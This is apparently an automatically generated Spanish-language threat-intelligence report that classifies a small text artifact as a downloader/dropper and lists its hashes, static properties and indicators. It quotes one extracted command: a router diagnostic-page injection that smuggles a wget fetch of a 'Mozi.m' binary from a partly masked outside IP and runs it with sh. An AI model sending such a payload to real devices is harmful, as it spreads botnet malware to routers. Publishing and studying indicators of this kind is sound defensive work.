# 🧬 Payload Analysis

`ef4a0434cdc1b1892503f0c82e46f93f69ba58ae38a3d511e66955dc37e98007`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:34:34+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ef4a0434cdc1b1892503f0c82e46f93f69ba58ae38a3d511e66955dc37e98007`
- **MD5:** `76c9b4d9112d3d7916fee83f24eb99a3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.11 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://14.231.104.XXX:59094/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 14.231.104.XXX | static_analysis |
| url | hxxp://14.231.104.XXX:59094/Mozi.m+-O+- | strings |
| hash | ef4a0434cdc1b1892503f0c82e46f93f69ba58ae38a3d511e66955dc37e98007 | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://14.231.104.XXX:59094/Mozi.m+-O+->/tmp/gpon80;sh | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
